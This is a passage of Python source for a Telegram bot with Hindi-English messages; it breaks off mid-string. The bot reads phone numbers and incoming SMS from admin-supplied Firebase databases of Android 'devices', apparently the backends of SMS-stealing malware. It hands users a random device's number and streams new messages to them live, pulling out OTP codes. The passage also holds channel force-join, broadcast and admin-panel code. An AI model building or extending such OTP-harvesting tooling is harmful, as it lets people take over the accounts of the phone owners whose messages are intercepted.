async def force_verify_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    first_name = q.from_user.first_name or "User"

    if maintenance_mode and uid not in ADMIN_IDS:
        try:
            await q.edit_message_caption(
                caption=_bold_blockquote("🛠️ 𝗠𝗔𝗜𝗡𝗧𝗘𝗡𝗔𝗡𝗖𝗘 𝗠𝗢𝗗𝗘 𝗢𝗡"),
                parse_mode="HTML")
        except Exception:
            pass
        return

    _user_join_cache.pop(uid, None)
    joined = await check_force_join(context.bot, uid)

    if joined:
        try:
            await q.answer("✅ Verified!")
        except Exception:
            pass
        try:
            await q.message.delete()
        except Exception:
            pass
        await _send_main_menu(context, q.message.chat_id, first_name, uid)
    else:
        unjoined = await get_unjoined_channels(context.bot, uid)
        try:
            await q.answer("❌ Pehle saare channels join karo!", show_alert=True)
        except Exception:
            pass
        kb = build_force_join_keyboard(unjoined)
        try:
            await q.message.delete()
        except Exception:
            pass
        await send_welcome_photo(
            chat_id=q.message.chat_id, first_name=first_name,
            user_id=uid, show_force_join=True,
            reply_markup=kb, bot=context.bot)


# ============================================================
# MAIN MENU
# ============================================================
def connect_inline_kb():
    return InlineKeyboardMarkup([
        [styled_button("🎲 𝗚𝗘𝗡𝗘𝗥𝗔𝗧𝗘 𝗡𝗨𝗠𝗕𝗘𝗥", "generate_number", "success")],
    ])


async def _send_main_menu(context, chat_id: int, first_name: str, uid: int):
    kb = connect_inline_kb()
    try:
        await context.bot.send_photo(
            chat_id=chat_id,
            photo=WELCOME_IMAGE_URL,
            caption=_bold_blockquote(build_welcome_caption_joined(first_name, uid)),
            parse_mode="HTML",
            reply_markup=kb,
        )
    except Exception as exc:
        logger.warning("welcome image failed: %s", exc)
        await context.bot.send_message(
            chat_id=chat_id,
            text=_bold_blockquote(build_welcome_caption_joined(first_name, uid)),
            parse_mode="HTML",
            reply_markup=kb,
        )


# ============================================================
# STYLING HELPERS
# ============================================================
def _bold_blockquote(text: str) -> str:
    if str(text).lstrip().startswith("<blockquote>"):
        return str(text)
    raw = str(text)

    def convert_plain(value: str) -> str:
        converted = []
        for char in value.replace("*", ""):
            code = ord(char)
            if "A" <= char <= "Z":
                converted.append(chr(0x1D5D4 + (code - ord("A"))))
            elif "a" <= char <= "z":
                converted.append(chr(0x1D5EE + (code - ord("a"))))
            elif "0" <= char <= "9":
                converted.append(chr(0x1D7EC + (code - ord("0"))))
            else:
                converted.append(char)
        return html_escape("".join(converted), quote=False)

    pieces = []
    cursor = 0
    pattern = re.compile(
        r"(?P<html_code><code>(?P<html_inner>.*?)</code>)|(?P<bt>`(?P<bt_inner>[^`]+)`)",
        re.DOTALL | re.IGNORECASE,
    )
    for match in pattern.finditer(raw):
        pieces.append(convert_plain(raw[cursor:match.start()]))
        if match.group("html_code"):
            inner = match.group("html_inner")
            pieces.append(f"<code>{html_escape(inner, quote=False)}</code>")
        else:
            pieces.append(f"<code>{html_escape(match.group('bt_inner'), quote=False)}</code>")
        cursor = match.end()
    pieces.append(convert_plain(raw[cursor:]))
    return f"<blockquote>{''.join(pieces)}</blockquote>"


def styled_button(text: str, callback_data: str, style: str = None):
    kwargs = {"callback_data": callback_data}
    if style:
        kwargs["api_kwargs"] = {"style": style}
    try:
        return InlineKeyboardButton(text, **kwargs)
    except TypeError:
        return InlineKeyboardButton(text, callback_data=callback_data)


def _format_time(ts_key) -> str:
    if not ts_key:
        return "Unknown"
    try:
        s = str(ts_key).strip()
        if re.fullmatch(r'\d+', s):
            n = int(s)
            if n > 10**12:
                n = n // 1000
            elif n < 10**9:
                return s
            dt = datetime.fromtimestamp(n)
            return dt.strftime("%d-%m-%Y | %I:%M:%S %p")
        return s
    except Exception:
        return str(ts_key)


# ============================================================
# ADMIN KEYBOARDS
# ============================================================
def admin_panel_kb():
    maintenance_label = "🟢 TURN BOT ON" if maintenance_mode else "🔴 TURN BOT OFF"
    channel_count = len(REQUIRED_CHANNELS)
    return InlineKeyboardMarkup([
        [styled_button("➕ ADD FIREBASE", "admin_add_firebase", "success")],
        [styled_button("📋 MANAGE FIREBASES", "admin_manage_fb", "primary")],
        [styled_button("🔍 CHECK FIREBASE (REFRESH NOW)", "admin_manual_refresh", "success")],
        [styled_button("📊 BOT STATISTICS", "admin_stats", "primary")],
        [styled_button("📢 BROADCAST", "admin_broadcast", "success")],
        [styled_button(f"➕ ADD JOIN CHANNEL ({channel_count})", "admin_add_channel", "success")],
        [styled_button("📋 MANAGE CHANNELS", "admin_channels", "primary")],
        [styled_button(maintenance_label, "admin_toggle_maintenance", "danger")],
    ])


def admin_firebases_kb():
    rows = []
    if not global_fb_list:
        rows.append([styled_button("➕ ADD FIREBASE", "admin_add_firebase", "success")])
    else:
        for i, (url, tag) in enumerate(global_fb_list):
            rows.append([styled_button(f"🔥 {tag}", f"admin_fb_info:{i}", "primary")])
            rows.append([
                styled_button("🔄 REFRESH", f"admin_fb_refresh:{i}", "success"),
                styled_button("🗑 DELETE", f"admin_fb_delete:{i}", "danger"),
            ])
        if len(global_fb_list) < MAX_FIREBASES:
            rows.append([styled_button("➕ ADD FIREBASE", "admin_add_firebase", "success")])
    rows.append([styled_button("🔙 ADMIN PANEL", "admin_back", "danger")])
    return InlineKeyboardMarkup(rows)


def admin_back_kb():
    return InlineKeyboardMarkup([
        [styled_button("🔙 ADMIN PANEL", "admin_back", "danger")]])


def admin_channels_kb():
    rows = []
    if not REQUIRED_CHANNELS:
        rows.append([styled_button("➕ ADD CHANNEL", "admin_add_channel", "success")])
    else:
        for index, channel in enumerate(REQUIRED_CHANNELS):
            rows.append([styled_button(
                f"🗑 REMOVE {channel.get('label', channel.get('id', '?'))[:35]}",
                f"admin_remove_channel:{index}", "danger")])
        rows.append([styled_button("➕ ADD CHANNEL", "admin_add_channel", "success")])
    rows.append([styled_button("🔙 ADMIN PANEL", "admin_back", "primary")])
    return InlineKeyboardMarkup(rows)


DEVICES_PER_PAGE = 6


def device_list_kb(devices: Dict[str, dict], page: int = 0):
    items = list(devices.items())[:80]
    total_pages = max(1, (len(items) + DEVICES_PER_PAGE - 1) // DEVICES_PER_PAGE)
    page = max(0, min(page, total_pages - 1))
    start = page * DEVICES_PER_PAGE
    page_items = items[start:start + DEVICES_PER_PAGE]
    rows = []
    for cid, info in page_items:
        phone = str(info.get("phone") or "").strip()
        label = f"🟢 {cid}"
        if phone and phone not in ("—", "N/A"):
            label += f"  |  {phone}"
        rows.append([styled_button(label[:60], f"dev:{cid}", "success")])
    nav = []
    if page > 0:
        nav.append(styled_button("◀️ PREV", f"devpage:{page-1}", "primary"))
    nav.append(styled_button(f"📄 {page+1}/{total_pages}", "noop"))
    if page < total_pages - 1:
        nav.append(styled_button("NEXT ▶️", f"devpage:{page+1}", "primary"))
    rows.append(nav)
    rows.append([styled_button("🔄 REFRESH", "scan_active", "primary")])
    rows.append([styled_button("🔙 BACK", "menu_back", "danger")])
    return InlineKeyboardMarkup(rows)


def device_actions_kb(device_id: str):
    return InlineKeyboardMarkup([
        [styled_button("📩 LAST 5 SMS", f"sms:{device_id}", "primary")],
        [styled_button("🎲 GENERATE AGAIN", "generate_number", "success")],
        [styled_button("🔙 BACK TO DEVICE LIST", "device_list", "danger")],
    ])


def sms_view_kb(device_id: str):
    return InlineKeyboardMarkup([
        [styled_button("🔄 REFRESH", f"sms_refresh:{device_id}", "primary")],
        [styled_button("🎲 GENERATE AGAIN", "generate_number", "success")],
        [styled_button("🔙 BACK TO DEVICE", f"dev:{device_id}", "danger")],
    ])


def sms_monitor_kb(device_id: str):
    return InlineKeyboardMarkup([
        [styled_button("⛔ STOP SMS MONITOR", f"smsmon_stop:{device_id}", "danger")],
        [styled_button("🔙 BACK TO DEVICE", f"dev:{device_id}", "primary")],
    ])


def manage_fb_kb(uid: int):
    sess = user_sessions.get(uid, {})
    fb_list = sess.get("fb_list", [])
    rows = []
    for i, (url, tag) in enumerate(fb_list):
        short = fb_host_short(url)
        rows.append([styled_button(f"{tag} — {short}", f"fbnoop:{i}", "primary")])
        rows.append([
            styled_button("👁 VIEW", f"scan_fb:{i}", "success"),
            styled_button("🗑 DELETE", f"delete_fb:{i}", "danger"),
        ])
    return InlineKeyboardMarkup(rows)


def firebase_connected_kb(uid: int):
    return InlineKeyboardMarkup([
        [styled_button("🔎 SCAN ACTIVE", "scan_active", "success")],
        [styled_button("🔗 MANAGE FIREBASE", "manage_firebase", "primary")],
    ])


# ============================================================
# ADMIN PANEL LIVE
# ============================================================
def _build_admin_fb_text() -> str:
    if not global_fb_list:
        return ("📋 *Manage Firebases*\n\n"
                "Abhi koi Firebase add nahi hai.\n"
                "➕ ADD FIREBASE se URL add karo.")
    lines = ["📋 *Manage Firebases*\n"]
    per_fb = global_device_cache.get("per_fb", {}) or {}
    for url, tag in global_fb_list:
        counts = per_fb.get(tag) or {}
        online = int(counts.get("online", 0))
        offline = int(counts.get("offline", 0))
        lines.append(f"*{tag}*\n   🟢 {online}  |  🔴 {offline}  |  📊 {online + offline}")
    lines.append(f"\nTotal panels: {len(global_fb_list)}/{MAX_FIREBASES}")
    lines.append(f"Cache: `{global_device_cache.get('updated_at') or 'not loaded'}`")
    lines.append("\n🔍 *CHECK FIREBASE* dabao refresh ke liye.")
    return "\n".join(lines)


async def _admin_panel_live_loop(bot, uid: int, chat_id: int, message_id: int):
    last_rendered = ""
    try:
        while True:
            await asyncio.sleep(ADMIN_PANEL_EDIT_INTERVAL)
            if uid not in admin_panel_live_tasks:
                break
            text = _build_admin_fb_text()
            if text == last_rendered:
                continue
            try:
                await bot.edit_message_text(
                    chat_id=chat_id, message_id=message_id, text=text,
                    parse_mode="Markdown", reply_markup=admin_firebases_kb())
                last_rendered = text
            except Exception as exc:
                msg = str(exc).lower()
                if "message is not modified" in msg:
                    last_rendered = text
                    continue
                if "message to edit not found" in msg or "message can't be edited" in msg:
                    break
                logger.info("admin panel live edit failed: %s", exc)
    except asyncio.CancelledError:
        raise
    except Exception as exc:
        logger.error("admin panel live loop crashed: %s", exc)
    finally:
        admin_panel_live_tasks.pop(uid, None)


def _stop_admin_panel_live_task(uid: int):
    task = admin_panel_live_tasks.pop(uid, None)
    if task and not task.done():
        task.cancel()


async def _start_admin_panel_live_task(bot, uid: int, chat_id: int, message_id: int):
    _stop_admin_panel_live_task(uid)
    task = asyncio.create_task(_admin_panel_live_loop(bot, uid, chat_id, message_id))
    admin_panel_live_tasks[uid] = task


# ============================================================
# SESSION
# ============================================================
async def _ensure_session(uid: int):
    sess = user_sessions.get(uid)
    if not sess:
        sess = {"fb_list": [], "active_fb_idx": 0, "devices": {},
                "current_device": "", "mode": "online", "device_page": 0}
        user_sessions[uid] = sess
    return sess


async def _show_cached_device_list(q, sess):
    devices = sess.get("devices", {})
    page = int(sess.get("device_page", 0) or 0)
    items = list(devices.items())[:80]
    total_pages = max(1, (len(items) + DEVICES_PER_PAGE - 1) // DEVICES_PER_PAGE)
    page = max(0, min(page, total_pages - 1))
    sess["device_page"] = page
    online_count = sess.get("online_count", 0)
    offline_count = sess.get("offline_count", 0)
    total_count = sess.get("total_count", online_count + offline_count)
    await q.edit_message_text(
        f"📞 *DEVICES INFO*\n\n"
        f"🟢 ONLINE : {online_count}\n"
        f"🔴 OFFLINE : {offline_count}\n"
        f"📊 TOTAL : {total_count}\n"
        f"🔗 Firebase: {len(sess.get('fb_list', []))}\n\n"
        "Tap a device below.",
        parse_mode="Markdown",
        reply_markup=device_list_kb(devices, page=page))


# ============================================================
# DEVICE VIEW
# ============================================================
def _build_device_view(device_id: str, info: dict):
    tag = info.get("fb_tag", "?")
    real_cid = info.get("real_cid", device_id)
    raw = info.get("raw") or {}
    phone = info.get("phone") or "N/A"
    online = bool(info.get("online"))
    network = raw.get("network") or raw.get("operator") or "—"
    android = raw.get("android") or raw.get("androidVersion") or raw.get("os") or "—"
    battery = raw.get("battery") or raw.get("batteryLevel") or "—"
    if isinstance(battery, (int, float)):
        battery = f"{int(battery)}%"
    text = (f"📱 *{real_cid}*\n\n"
            f"🌐 Firebase: `{tag}`\n"
            f"🆔 ID: `{real_cid}`\n"
            f"📡 Status: {'🟢 ONLINE' if online else '🔴 OFFLINE'}\n"
            f"📞 Phone: `{phone}`\n"
            f"📶 Network: {network}\n"
            f"🤖 Android: {android}\n"
            f"🔋 Battery: {battery}")
    return text, device_actions_kb(device_id)


async def _show_device_view(q, sess, device_id: str):
    info = sess.get("devices", {}).get(device_id)
    if not info:
        parsed_tag, parsed_cid = _parse_prefixed(device_id)
        fb_url = _find_fb_url_by_tag(q.from_user.id, parsed_tag)
        if fb_url:
            info = {
                "fb_url": fb_url, "fb_tag": parsed_tag, "real_cid": parsed_cid,
                "phone": "", "online": True, "raw": {},
            }
            sess.setdefault("devices", {})[device_id] = info
        else:
            await _safe_edit_callback_message(
                q, "❌ *Device not found.*\n\nPlease tap REFRESH.",
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔄 REFRESH", callback_data="scan_active")],
                    [InlineKeyboardButton("🔙 BACK", callback_data="menu_back")],
                ]))
            return False
    text, markup = _build_device_view(device_id, info)
    sess["current_device"] = device_id
    await _safe_edit_callback_message(q, text, parse_mode="Markdown",
                                       reply_markup=markup)
    return True


# ============================================================
# /start
# ============================================================
async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    first_name = update.effective_user.first_name or "User"

    if uid not in known_users:
        known_users.add(uid)
        _save_user_ids()

    if not await _require_access(update, context):
        return

    stop_sms_monitor(uid)
    _stop_admin_panel_live_task(uid)
    sess = await _ensure_session(uid)
    sess["devices"] = {}
    sess["current_device"] = ""
    sess["mode"] = "online"

    await _send_main_menu(context, update.effective_chat.id, first_name, uid)


# ============================================================
# SAFE EDIT
# ============================================================
async def _safe_edit_callback_message(q, text: str, *, parse_mode=None, reply_markup=None):
    msg = q.message
    is_photo = bool(getattr(msg, "photo", None))
    try:
        if is_photo:
            await q.edit_message_caption(
                caption=text, parse_mode=parse_mode, reply_markup=reply_markup)
        else:
            await q.edit_message_text(
                text, parse_mode=parse_mode, reply_markup=reply_markup)
        return True
    except Exception as e1:
        err = str(e1).lower()
        if "message is not modified" in err:
            return True
        try:
            await msg.delete()
        except Exception:
            pass
        try:
            await q.bot.send_message(
                chat_id=msg.chat_id, text=text,
                parse_mode=parse_mode, reply_markup=reply_markup)
            return True
        except Exception as e2:
            logger.error("safe edit failed: %s | fallback: %s", e1, e2)
            return False


# ============================================================
# GENERATE NUMBER
# ============================================================
async def generate_number_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    if not await _require_access(update, context, edit_target=q.message):
        return
    uid = q.from_user.id
    chat_id = q.message.chat_id
    sess = await _ensure_session(uid)

    if not global_fb_list:
        await _safe_edit_callback_message(
            q,
            "⚠️ *No numbers available right now.*\n\n"
            "Admin ne abhi koi Firebase add nahi kiya.",
            parse_mode="Markdown", reply_markup=connect_inline_kb())
        return

    devices = dict(global_device_cache.get("devices") or {})
    sess["fb_list"] = list(global_fb_list)

    # ⚡ Agar cache empty hai → ek baar fresh scan karo
    if not devices and global_fb_list:
        await _safe_edit_callback_message(
            q,
            "🔄 *Fresh scan ho raha hai...*\n\n⏳ 5-10 seconds wait karo...",
            parse_mode="Markdown", reply_markup=connect_inline_kb())
        try:
            await refresh_global_device_cache()
            devices = dict(global_device_cache.get("devices") or {})
        except Exception as exc:
            logger.warning("auto refresh on generate failed: %s", exc)

    if not devices:
        await _safe_edit_callback_message(
            q,
            "⚠️ *Abhi ready online number nahi hai.*\n\n"
            "Admin ko bolo REFRESH dabaye.",
            parse_mode="Markdown", reply_markup=connect_inline_kb())
        return

    device_id, info = random.choice(list(devices.items()))
    sess["devices"] = {device_id: info}
    sess["current_device"] = device_id
    sess["mode"] = "online"

    tag = info.get("fb_tag", "?")
    real_cid = info.get("real_cid", device_id)
    phone = info.get("phone") or "N/A"
    raw = info.get("raw") or {}
    network = raw.get("network") or raw.get("operator") or "—"
    android = raw.get("android") or raw.get("androidVersion") or raw.get("os") or "—"
    battery = raw.get("battery") or raw.get("batteryLevel") or "—"
    if isinstance(battery, (int, float)):
        battery = f"{int(battery)}%"

    stop_sms_monitor(uid)

    # ⚡ Instant start with empty baseline — first-cycle suppress will skip old SMS
    start_sms_monitor(
        context.bot, uid, chat_id, device_id, unlimited=True,
        baseline_fingerprints=set(),
        fb_url=info.get("fb_url", ""))

    text_msg = (
        f"🎲 *NUMBER GENERATED*\n\n"
        f"📱 Device: `{real_cid}`\n"
        f"📞 Phone: `{phone}`\n"
        f"🌐 Panel: `{tag}`\n"
        f"📡 Status: 🟢 ONLINE\n"
        f"📶 Network: {network}\n"
        f"🤖 Android: {android}\n"
        f"🔋 Battery: {battery}\n\n"
        f"✅ *OTP Monitor ON*\n"
        f"Naya OTP turant is chat me aayega.")
    await _safe_edit_callback_message(
        q, text_msg, parse_mode="Markdown",
        reply_markup=device_actions_kb(device_id))


# ============================================================
# ADMIN COMMAND
# ============================================================
async def admin_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in ADMIN_IDS:
        await update.message.reply_text("⛔ Admin only.")
        return
    _stop_admin_panel_live_task(uid)
    await update.message.reply_text(
        "🛠 *Admin Panel*\n\nSelect an action:",
        parse_mode="Markdown", reply_markup=admin_panel_kb())


# ============================================================
# ADMIN TEXT INPUT
# ============================================================
async def admin_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global global_fb_list
    uid = update.effective_user.id
    action = context.user_data.get("admin_action")
    if uid not in ADMIN_IDS or not action:
        return
    text = (update.message.text or "").strip()

    if action == "add_firebase":
        urls = extract_firebase_urls(text)
        if not urls:
            single = normalize_fb_url(text)
            if single:
                urls = [single]
        if not urls:
            await update.message.reply_text(
                "❌ Koi valid Firebase URL nahi mila.",
                reply_markup=admin_back_kb())
            return

        existing = {u for u, _ in global_fb_list}
        seen_local = set()
        fresh = []
        duplicates = 0
        for u in urls:
            if u in existing or u in seen_local:
                duplicates += 1
                continue
            seen_local.add(u)
            fresh.append(u)

        if not fresh:
            context.user_data.pop("admin_action", None)
            await update.message.reply_text(
                f"⚠️ Saare URL already added hain.\n📋 Detected: `{len(urls)}`",
                parse_mode="Markdown", reply_markup=admin_panel_kb())
            return

        free_slots = MAX_FIREBASES - len(global_fb_list)
        if free_slots <= 0:
            context.user_data.pop("admin_action", None)
            await update.message.reply_text(
                f"❌ Max {MAX_FIREBASES} Firebase already added.",
                reply_markup=admin_panel_kb())
            return

        to_add = fresh[:free_slots]
        overflow = len(fresh) - len(to_add)

        status_msg = await update.message.reply_text(
            f"⏳ Detected `{len(urls)}` URL(s) — validating `{len(to_add)}`...",
            parse_mode="Markdown")

        session = await get_http_session()
        added = []
        dead = []
        for url in to_add:
            try:
                clients, _ = await _try_fetch_clients(session, url)
                if clients:
                    new_tag = f"FB{len(global_fb_list) + 1}"
                    global_fb_list.append((url, new_tag))
                    added.append((url, new_tag))
                else:
                    dead.append(url)
            except Exception as exc:
                logger.warning("bulk fb validate failed %s: %s", url, exc)
                dead.append(url)

        context.user_data.pop("admin_action", None)

        if added:
            _save_global_firebases()
            try:
                await refresh_global_device_cache()
            except Exception as exc:
                logger.warning("refresh after bulk add failed: %s", exc)

        lines = ["✅ *BULK FIREBASE ADD COMPLETE*", ""]
        lines.append(f"🔍 Detected : `{len(urls)}`")
        lines.append(f"➕ Added    : `{len(added)}`")
        lines.append(f"❌ Dead     : `{len(dead)}`")
        if duplicates:
            lines.append(f"♻️ Duplicate: `{duplicates}`")
        if overflow:
            lines.append(f"⚠️ Overflow : `{overflow}` (max limit)")
        lines.append(f"📊 Total    : `{len(global_fb_list)}/{MAX_FIREBASES}`")
        if added:
            lines.append("")
            lines.append("*Added panels:*")
            for url, tag in added[:15]:
                lines.append(f"• `{tag}` — `{fb_host_short(url)}`")
            if len(added) > 15:
                lines.append(f"… +{len(added) - 15} more")
        if dead:
            lines.append("")
            lines.append("*Dead:*")
            for url in dead[:5]:
                lines.append(f"• `{fb_host_short(url)}`")
            if len(dead) > 5:
                lines.append(f"… +{len(dead) - 5} more")

        try:
            await status_msg.edit_text(
                "\n".join(lines), parse_mode="Markdown",
                reply_markup=admin_panel_kb())
        except Exception:
            await update.message.reply_text(
                "\n".join(lines), parse_mode="Markdown",
                reply_markup=admin_panel_kb())
        return

    if action == "broadcast":
        context.user_data.pop("admin_action", None)
        sent = failed = 0
        for target_uid in list(known_users):
            try:
                await context.bot.send_message(chat_id=target_uid, text=text)
                sent += 1
            except Exception as exc:
                failed += 1
                logger.info("broadcast failed for %s: %s", target_uid, exc)
        await update.message.reply_text(
            f"📢 Broadcast complete.\n\n✅ Sent: {sent}\n❌ Failed: {failed}",
            reply_markup=admin_panel_kb())
        return

    if action == "add_channel":
        username = text
        if username.startswith("https://t.me/"):
            username = "@" + username.rstrip("/").rsplit("/", 1)[-1].split("?", 1)[0]
        elif not username.startswith("@") and not username.startswith("-"):
            username = "@" + username

        if not (re.fullmatch(r"@[A-Za-z0-9_]{5,32}", username)
                or re.fullmatch(r"-100\d{6,}", username)):
            await update.message.reply_text(
                "❌ Valid channel username bhejein.\n\n"
                "Examples:\n• `@mychannel`\n• `https://t.me/mychannel`\n"
                "• `-1001234567890` (private)",
                parse_mode="Markdown", reply_markup=admin_back_kb())
            return

        if any(str(c.get("id")).lower() == username.lower() for c in REQUIRED_CHANNELS):
            await update.message.reply_text("⚠️ Yeh channel already added hai.",
                                            reply_markup=admin_panel_kb())
            context.user_data.pop("admin_action", None)
            return

        try:
            chat = await context.bot.get_chat(username)
            title = chat.title or username
        except Exception as exc:
            logger.warning("admin channel validation failed: %s", exc)
            await update.message.reply_text(
                "❌ Channel nahi mila ya bot ko access nahi hai.\n\n"
                "⚠️ Bot ko us channel ka *admin* banana zaroori hai.",
                parse_mode="Markdown", reply_markup=admin_back_kb())
            return

        join_url = ""
        invite_link = getattr(chat, "invite_link", None)
        username_field = getattr(chat, "username", None)
        if username_field:
            join_url = f"https://t.me/{username_field}"
        elif invite_link:
            join_url = invite_link
        else:
            try:
                invite = await context.bot.create_chat_invite_link(chat_id=chat.id)
                join_url = invite.invite_link
            except Exception:
                join_url = ""

        if not join_url:
            await update.message.reply_text(
                "❌ Join link generate nahi ho paya.",
                reply_markup=admin_back_kb())
            return

        REQUIRED_CHANNELS.append({
            "id": str(chat.id), "label": title, "url": join_url,
        })
        _save_required_channels()
        _user_join_cache.clear()
        context.user_data.pop("admin_action", None)
        await update.message.reply_text(
            f"✅ *Force-Join Channel Added*\n\n"
            f"📢 Title: `{title}`\n"
            f"🆔 ID: `{chat.id}`\n"
            f"🔗 URL: {join_url}\n\n"
            f"📊 Total Channels: `{len(REQUIRED_CHANNELS)}`",
            parse_mode="Markdown", reply_markup=admin_panel_kb())
        return


async def text_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.user_data.get("admin_action"):
        await admin_text_input(update, context)


# ============================================================
# SMS MONITOR
# ============================================================
async def _delete_monitor_messages(bot, uid: int, chat_id: int, message_ids=None):
    state = sms_monitor_state.get(uid, {})
    ids = list(message_ids if message_ids is not None
               else state.get("sent_message_ids", []))
    if not ids:
        return
    for message_id in ids:
        try:
            await bot.delete_message(chat_id=chat_id, message_id=message_id)
        except Exception as exc:
            logger.info("could not delete SMS %s: %s", message_id, exc)
    if message_ids is None:
        state["sent_message_ids"] = []


async def _delete_monitor_status_message(bot, uid: int, chat_id: int):
    state = sms_monitor_state.get(uid, {})
    message_id = state.get("monitor_message_id")
    if not message_id:
        return
    try:
        await bot.delete_message(chat_id=chat_id, message_id=message_id)
    except Exception as exc:
        logger.info("could not delete monitor status %s: %s", message_id, exc)
    state.pop("monitor_message_id", None)


def touch_sms_monitor(uid: int):
    state = sms_monitor_state.get(uid)
    if state:
        state["last_activity"] = time.monotonic()


def stop_sms_monitor(uid: int):
    task = sms_monitor_tasks.pop(uid, None)
    state = sms_monitor_state.get(uid)
    if state:
        bot = state.get("bot")
        chat_id = state.get("chat_id")
        if bot and chat_id:
            message_ids = list(state.get("sent_message_ids", []))
            if message_ids:
                asyncio.create_task(_delete_monitor_messages(bot, uid, chat_id, message_ids))
            asyncio.create_task(_delete_monitor_status_message(bot, uid, chat_id))
    if task and not task.done():
        task.cancel()
    sms_monitor_state.pop(uid, None)


def _msg_fingerprint(ts_key: str, m: dict) -> str:
    sender = _extract_msg_sender(m)
    body = _extract_msg_body(m)
    tval = ""
    if isinstance(m, dict):
        for k in ("time", "timestamp", "receivedTime", "sentTime",
                  "dateTime", "createdAt"):
            v = m.get(k)
            if v is not None and str(v).strip():
                tval = str(v).strip()
                break
    return f"{ts_key}|{sender}|{body}|{tval}"


async def _sms_monitor_loop(bot, uid: int, chat_id: int, device_id: str,
                             unlimited: bool = False,
                             baseline_fingerprints=None,
                             fb_url: str = "", task_token=None, state: dict = None):
    started = time.monotonic()
    seen_fingerprints = set(baseline_fingerprints or ())
    # 🛡️ FIRST CYCLE SUPPRESS — purane SMS forward mat karo
    suppress_first_cycle = not bool(baseline_fingerprints)
    session = await get_http_session()
    real_cid = device_id
    resolved_fb_url = fb_url
    stop_reason = None
    try:
        tag, real_cid = _parse_prefixed(device_id)
        if not resolved_fb_url:
            resolved_fb_url = (
                (state or {}).get("fb_url")
                or sms_monitor_state.get(uid, {}).get("fb_url")
                or _find_fb_url_by_tag(uid, tag))
        if not resolved_fb_url:
            return
        url_with_query = build_fb_endpoint(
            resolved_fb_url, f"messages/{real_cid}",
            query='orderBy="$key"&limitToLast=10')
        url_plain = build_fb_endpoint(resolved_fb_url, f"messages/{real_cid}")
        while True:
            if not unlimited and (time.monotonic() - started >= SMS_MONITOR_DURATION):
                break
            current_state = sms_monitor_state.get(uid)
            if current_state is None or current_state is not state:
                break
            if unlimited and uid not in ADMIN_IDS:
                last_activity = current_state.get("last_activity", started)
                if (time.monotonic() - last_activity) >= SMS_MONITOR_IDLE_TIMEOUT:
                    stop_reason = "idle"
                    break
            data, status, err = await fb_get_json(session, url_with_query,
                                                   retries=0, timeout=3)
            if status != "SUCCESS" or not isinstance(data, (dict, list)) or not data:
                data, status, err = await fb_get_json(session, url_plain,
                                                       retries=0, timeout=3)
            if status != "SUCCESS" or not isinstance(data, (dict, list)) or not data:
                await asyncio.sleep(SMS_MONITOR_INTERVAL)
                continue
            pairs = _newest_with_keys(data, limit=10)
            current_fps = [(k, m, _msg_fingerprint(k, m)) for k, m in pairs]

            # 🛡️ SUPPRESS FIRST CYCLE
            if suppress_first_cycle:
                for _, _, fp in current_fps:
                    seen_fingerprints.add(fp)
                suppress_first_cycle = False
                logger.info("[SMS MONITOR] baseline captured uid=%s count=%d",
                            uid, len(seen_fingerprints))
                await asyncio.sleep(SMS_MONITOR_INTERVAL)
                continue

            new_msgs = [(k, m, fp) for k, m, fp in current_fps
                        if fp not in seen_fingerprints]
            new_msgs.sort(key=lambda x: str(x[0]))
            for ts_key, m, fp in new_msgs:
                sender = _extract_msg_sender(m)
                body = _extract_msg_body(m)
                if not body:
                    body = "(no message body)"
                when = _extract_msg_time(m, ts_key).replace(" | ", " • ")
                otp = _extract_otp(body)
                alert_lines = [
                    "💬 ʟɪᴠᴇ ꜱᴍꜱ ʀᴇᴄᴇɪᴠᴇᴅ!",
                    "〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️",
                    "",
                    f"📱 ꜰrom: {sender}",
                    f"⏱️ ᴛime: {when}",
                    "",
                    f"{body}",
                ]
                if otp:
                    alert_lines.extend(["", f"🔑 ᴏᴛᴘ ᴅᴇᴛᴇᴄᴛᴇᴅ: `{otp}`"])
                alert_text = "\n".join(alert_lines)
                try:
                    sent_message = await bot.send_message(
                        chat_id=chat_id,
                        text=_bold_blockquote(alert_text),
                        parse_mode="HTML")
                    seen_fingerprints.add(fp)
                    state = sms_monitor_state.get(uid)
                    if state is not None and state is current_state:
                        state.setdefault("sent_message_ids", []).append(
                            sent_message.message_id)
                except Exception as e:
                    logger.error("[SMS MONITOR] notify error uid=%s err=%r",
                                 uid, e, exc_info=True)
            if len(seen_fingerprints) > 200:
                seen_fingerprints = set(fp for _, _, fp in current_fps)
            await asyncio.sleep(SMS_MONITOR_INTERVAL)

        if not unlimited:
            await _delete_monitor_messages(bot, uid, chat_id)
            await _delete_monitor_status_message(bot, uid, chat_id)
            try:
                await bot.send_message(
                    chat_id=chat_id,
                    text=("⏱️ *SMS Monitor Auto-Stopped*\n\n"
                          "✅ Time poora ho gaya.\n"
                          "▶️ Dobara GENERATE NUMBER dabao."),
                    parse_mode="Markdown", reply_markup=connect_inline_kb())
            except Exception as e:
                logger.error(f"auto-stop notify: {e}")
        elif stop_reason == "idle":
            await _delete_monitor_messages(bot, uid, chat_id)
            await _delete_monitor_status_message(bot, uid, chat_id)
            try:
                await bot.send_message(
                    chat_id=chat_id,
                    text=_bold_blockquote(
                        "⏱️ 𝗠𝗢𝗡𝗜𝗧𝗢𝗥 𝗔𝗨𝗧𝗢-𝗦𝗧𝗢𝗣𝗣𝗘𝗗\n\n"
                        "⚠️ 𝟭𝟬 𝗺𝗶𝗻𝘂𝘁𝗲𝘀 𝘀𝗲 𝗸𝗼𝗶 𝗯𝘂𝘁𝘁𝗼𝗻 𝗻𝗮𝗵𝗶 𝗱𝗮𝗯𝗮𝘆𝗮\n\n"
                        "🔄 𝗡𝗮𝘆𝗮 𝗺𝗼𝗻𝗶𝘁𝗼𝗿 𝘀𝘁𝗮𝗿𝘁 𝗸𝗮𝗿𝗻𝗲 𝗸𝗲 𝗹𝗶𝘆𝗲 /start 𝗱𝗮𝗯𝗮𝗼."),
